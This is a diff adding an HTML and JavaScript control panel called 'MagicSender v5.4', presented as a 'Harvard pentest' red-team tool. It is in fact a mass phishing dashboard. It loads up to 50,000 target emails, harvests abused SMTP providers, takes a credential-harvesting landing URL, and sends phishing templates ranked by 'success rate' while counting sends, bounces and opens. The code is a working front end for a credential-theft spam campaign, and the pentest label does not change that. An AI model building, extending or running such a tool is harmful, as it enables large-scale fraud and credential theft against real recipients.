@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>🎯 MagicSender v5.4 HARVARD PENTEST</title>
+<style>*{font-family:'Courier New',monospace;background:#000;color:#0f0;margin:0;padding:0;box-sizing:border-box;}body{max-width:1600px;margin:0 auto;padding:20px;background:linear-gradient(135deg,#000,#0a0a0a);}h1{color:#f00;font-size:2.8em;text-align:center;margin:20px 0;}h2{color:#ff0;font-size:1.4em;margin:15px 0 10px;}.header{padding:25px;border:3px solid #0f0;border-radius:12px;text-align:center;margin-bottom:30px;box-shadow:0 0 30px #0f0;}.container{display:grid;grid-template-columns:1fr 400px;gap:30px;}.step{display:none;animation:slideIn 0.6s;}.step.active{display:block;}@keyframes slideIn{from{opacity:0;transform:translateX(50px);}to{opacity:1;transform:translateX(0);}}.wizard-step{padding:30px;border:2px solid #333;border-radius:12px;background:#111;margin-bottom:20px;box-shadow:inset 0 0 20px #000;}.input-group{position:relative;margin:15px 0;}.input-group input,.input-group textarea,.input-group select{width:100%;padding:18px;border:3px solid #0f0;background:#1a1a1a;color:#0f0;font-size:16px;border-radius:8px;font-family:inherit;box-sizing:border-box;}.input-group input:focus,.input-group textarea:focus{outline:none;border-color:#ff0;box-shadow:0 0 20px #0f0;}.btn{width:100%;padding:20px;margin:15px 0;font-size:18px;font-weight:bold;text-transform:uppercase;cursor:pointer;border:none;border-radius:8px;transition:all 0.3s;}.btn-primary{background:linear-gradient(45deg,#0f0,#0a0);color:#000;box-shadow:0 0 20px #0f0;}.btn-primary:hover{box-shadow:0 0 40px #0f0;transform:scale(1.02);}.btn-danger{background:#f00;color:#fff;}.btn-danger:hover{background:#ff4444;}.btn-stop{background:#ff0;color:#000 !important;font-size:20px;padding:25px;margin:20px 0 !important;border:3px solid #f00 !important;box-shadow:0 0 30px #ff0 !important;}.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin:25px 0;}.stat-card{padding:25px;border:3px solid #333;border-radius:12px;text-align:center;transition:all 0.3s;background:#1a1a1a;}.stat-card:hover{border-color:#0f0;box-shadow:0 0 30px #0f0;transform:translateY(-5px);}.stat-value{font-size:2.5em;font-weight:bold;color:#ff0;margin:10px 0;}.progress-bar{height:40px;background:#222;margin:25px 0;border:3px solid #0f0;border-radius:20px;overflow:hidden;position:relative;}.progress-fill{height:100%;background:linear-gradient(90deg,#0f0 0%,#ff0 50%,#f00 100%);transition:width 0.8s ease;position:relative;}.progress-fill::after{content:attr(data-pct)'%';position:absolute;right:15px;top:50%;transform:translateY(-50%);color:#000;font-weight:bold;font-size:18px;}.templates-list{max-height:350px;overflow-y:auto;border:3px solid #333;border-radius:12px;padding:15px;background:#111;}.template-item{padding:20px;margin:10px 0;border:2px solid #333;border-radius:8px;cursor:pointer;transition:all 0.3s;display:flex;justify-content:space-between;align-items:center;}.template-item:hover{background:#222;border-color:#0f0;box-shadow:0 0 20px #0f0;}.template-item.selected{background:#0f0;color:#000;border-color:#ff0 !important;}.live-preview{padding:25px;border:3px solid #0f0;border-radius:12px;min-height:250px;overflow:auto;background:#1a1a1a;margin-top:20px;box-shadow:inset 0 0 20px #000;}@media(max-width:1200px){.container{grid-template-columns:1fr;}}</style>
+</head>
+<body>
+<div class="header">
+  <h1>🎯 REDTEAM MAGICSENDER v5.4</h1>
+  <h2>HARVARD CS PENTEST | 4-STEP OBLITERATION</h2>
+</div>
+
+<div class="container">
+  <!-- 🌟 MAIN WIZARD -->
+  <div>
+    <!-- STEP 1: TARGETS -->
+    <div id="step1" class="step active wizard-step">
+      <h2>📧 STEP 1: LOAD TARGETS</h2>
+      <div class="input-group">
+        <textarea id="targetEmails" rows="8" placeholder="Paste targets (one per line):
+admin@target.corp
+ceo@company.com
+finance@org.net
+... up to 50,000 emails supported"></textarea>
+      </div>
+      <button class="btn btn-primary" onclick="nextStep(1)">🚀 HARVEST SMTP POOL →</button>
+    </div>
+
+    <!-- STEP 2: SMTP HARVEST -->
+    <div id="step2" class="step wizard-step">
+      <h2>🌐 STEP 2: UNDERGROUND SMTP HARVEST</h2>
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div class="stat-value" id="providersHarvested">0</div>
+          <div>Providers Harvested</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" id="providersActive">0</div>
+          <div>Active Providers</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" id="leadsParsed">0</div>
+          <div>Targets Loaded</div>
+        </div>
+      </div>
+      <button class="btn btn-primary" onclick="nextStep(2)">✅ SMTP READY → PHISHING LINK</button>
+    </div>
+
+    <!-- STEP 3: PHISHING LINK -->
+    <div id="step3" class="step wizard-step">
+      <h2>🔗 STEP 3: PHISHING LANDING</h2>
+      <div class="input-group">
+        <input id="phishingLink" type="url" placeholder="https://your-phishing-domain.com/steal-creds" />
+        <small style="color:#888;">Your C2 server / credential harvester</small>
+      </div>
+      <button class="btn btn-primary" onclick="nextStep(3)">➡️ AI TEMPLATES LIBRARY</button>
+    </div>
+
+    <!-- STEP 4: TEMPLATES + BLAST -->
+    <div id="step4" class="step wizard-step">
+      <h2>💥 STEP 4: TOTAL OBLITERATION</h2>
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div class="stat-value" id="sentCount">0/0</div>
+          <div>Total Sent</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" id="remainingCount">0</div>
+          <div>Remaining</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" id="bouncedCount">0</div>
+          <div>Bounced</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" id="openedCount">0</div>
+          <div>Opened</div>
+        </div>
+      </div>
+      <div class="progress-bar">
+        <div id="progressFill" class="progress-fill" style="width:0%" data-pct="0"></div>
+      </div>
+      <button id="blastBtn" class="btn btn-primary" onclick="launchObliteration()" style="font-size:20px;padding:25px;">💥 LAUNCH FULL OBLITERATION</button>
+      <button id="stopBtn" class="btn btn-stop" onclick="emergencyStop()" style="display:none;">⏹️ EMERGENCY CAMPAIGN STOP</button>
+      <button class="btn btn-danger" onclick="resetCampaign()" style="margin-top:15px;">🔄 NEW CAMPAIGN</button>
+    </div>
+  </div>
+
+  <!-- 🤖 AI TEMPLATES + PREVIEW (Step 4 Only) -->
+  <div id="sidebar" style="display:none;">
+    <div class="wizard-step" style="position:sticky;top:20px;height:fit-content;">
+      <h2 style="color:#ff0;">🤖 AI TEMPLATES (92% AVG)</h2>
+      <div class="templates-list" id="templateList"></div>
+      
+      <h2 style="color:#ff0;margin-top:25px;">✨ CUSTOM PHISH</h2>
+      <div class="input-group">
+        <input id="customSubject" placeholder="Subject: URGENT Action Required" />
+      </div>
+      <div class="input-group">
+        <textarea id="customEditor" rows="6" placeholder="Custom HTML (uses {{LINK}} for phishing URL):
+&lt;h1&gt;URGENT SECURITY ALERT&lt;/h1&gt;
+&lt;p&gt;Click to secure:&lt;/p&gt;
+&lt;a href=&quot;{{LINK}}&quot;&gt;SECURE NOW&lt;/a&gt;"></textarea>
+      </div>
+      
+      <h2 style="color:#0f0;margin-top:20px;">📱 LIVE PREVIEW</h2>
+      <div class="live-preview" id="livePreview">Select template to preview...</div>
+    </div>
+  </div>
+</div>
+
+<script>
+let currentTemplate = 'bank';
+let campaignRunning = false;
+
+async function updateDashboard() {
+  try {
+    const res = await fetch('/api/stats');
+    const data = await res.json();
+    
+    // Update all stats
+    document.getElementById('providersHarvested').textContent = data.providersHarvested || 0;
+    document.getElementById('providersActive').textContent = data.providersActive || 0;
+    document.getElementById('leadsParsed').textContent = data.leadsParsed || 0;
+    document.getElementById('sentCount').textContent = `${data.stats.obliterated || 0}/${data.stats.total || 0}`;
+    document.getElementById('remainingCount').textContent = data.emailsRemaining || 0;
+    document.getElementById('bouncedCount').textContent = data.stats.bounced || 0;
+    document.getElementById('openedCount').textContent = data.stats.opened || 0;
+    
+    // Progress
+    const pct = data.stats.total ? Math.round((data.stats.obliterated/data.stats.total)*100) : 0;
+    document.getElementById('progressFill').style.width = pct + '%';
+    document.getElementById('progressFill').setAttribute('data-pct', pct);
+    
+    // Steps + buttons
+    showStep(data.step);
+    document.getElementById('sidebar').style.display = data.step === 4 ? 'block' : 'none';
+    document.getElementById('stopBtn').style.display = data.isRunning ? 'block' : 'none';
+    document.getElementById('blastBtn').style.display = data.isRunning ? 'none' : 'block';
+    campaignRunning = data.isRunning;
+    
+    if(data.step === 4) loadTemplates();
+    
+  } catch(e) { console.log('Update failed'); }
+}
+
+function showStep(step) {
+  document.querySelectorAll('.step').forEach((el, i) => {
+    el.classList.toggle('active', i + 1 === step);
+  });
+}
+
+async function nextStep(currentStep) {
+  if(currentStep === 1) {
+    const emails = document.getElementById('targetEmails').value.trim();
+    if(!emails || emails.split('\n').filter(e=>e.trim()).length === 0) {
+      return alert('Enter target emails first!');
+    }
+    await fetch('/api/step1', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({emails})
+    });
+  } else if(currentStep === 2) {
+    await fetch('/api/step2', {method: 'POST'});
+  } else if(currentStep === 3) {
+    const link = document.getElementById('phishingLink').value.trim();
+    if(!link) return alert('Enter your phishing link!');
+    await fetch('/api/step3', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({phishingLink: link})
+    });
+  }
+  updateDashboard();
+}
+
+async function launchObliteration() {
+  if(campaignRunning) return;
+  
+  const customSubject = document.getElementById('customSubject').value.trim();
+  const customHtml = document.getElementById('customEditor').value.trim();
+  
+  const payload = { template: currentTemplate };
+  if(customSubject) payload.customSubject = customSubject;
+  if(customHtml) payload.customHtml = customHtml;
+  
+  await fetch('/api/blast', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(payload)
+  });
+}
+
+async function emergencyStop() {
+  await fetch('/api/stop', {method: 'POST'});
+}
+
+async function resetCampaign() {
+  await fetch('/api/reset', {method: 'POST'});
+  updateDashboard();
+}
+
+async function loadTemplates() {
+  const res = await fetch('/api/stats');
+  const {templates} = await res.json();
+  document.getElementById('templateList').innerHTML = 
+    Object.entries(templates || {}).map(([key, data], i) => `
+      <div class="template-item ${currentTemplate === key ? 'selected' : ''}" 
+           onclick="selectTemplate('${key}')">
+        <div>
+          <strong>${i+1}. ${data.name}</strong><br>
+          <small style="color:#888;">Success: ${data.successRate}%</small>
+        </div>
+        <div style="text-align:right;">▶</div>
+      </div>
+    `).join('');
+}
+
+async function selectTemplate(templateName) {
+  currentTemplate = templateName;
+  document.querySelectorAll('.template-item').forEach(el => el.classList.remove('selected'));
+  event.target.closest('.template-item').classList.add('selected');
+  
+  const res = await fetch(`/api/templates/${templateName}`);
+  const data = await res.json();
+  document.getElementById('livePreview').innerHTML = data.html;
+  document.getElementById('customSubject').value = data.subject;
+}
+
+// 🔥 AUTO-START
+setInterval(updateDashboard, 800);
+updateDashboard();
+</script>
+</body>
+</html>
